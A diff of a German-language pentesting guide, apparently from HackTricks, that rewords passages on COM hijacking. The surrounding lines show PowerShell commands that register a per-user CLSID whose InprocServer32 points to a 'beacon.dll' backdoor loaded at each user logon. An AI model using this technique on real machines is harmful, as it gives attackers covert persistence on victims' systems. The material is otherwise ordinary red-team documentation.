@@ -10,7 +10,7 @@ Da die Werte von HKCU von den Benutzern geändert werden können, könnte **COM 
 - wo das _Ergebnis_ **NAME NOT FOUND** ist.
 - und der _Pfad_ mit **InprocServer32** endet.
 
-Sobald Sie entschieden haben, welche nicht existierende COM-Komponente Sie nachahmen möchten, führen Sie die folgenden Befehle aus. _Seien Sie vorsichtig, wenn Sie sich entscheiden, eine COM-Komponente nachzuahmen, die alle paar Sekunden geladen wird, da dies übertrieben sein könnte._
+Sobald Sie entschieden haben, welche nicht existierende COM Sie nachahmen möchten, führen Sie die folgenden Befehle aus. _Seien Sie vorsichtig, wenn Sie sich entscheiden, eine COM nachzuahmen, die alle paar Sekunden geladen wird, da dies übertrieben sein könnte._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
@@ -72,6 +72,6 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-Dann können Sie einfach den HKCU-Eintrag erstellen, und jedes Mal, wenn sich der Benutzer anmeldet, wird Ihr Backdoor aktiviert. 
+Dann können Sie einfach den HKCU-Eintrag erstellen, und jedes Mal, wenn der Benutzer sich anmeldet, wird Ihr Backdoor aktiviert.
 
 {{#include ../../banners/hacktricks-training.md}}
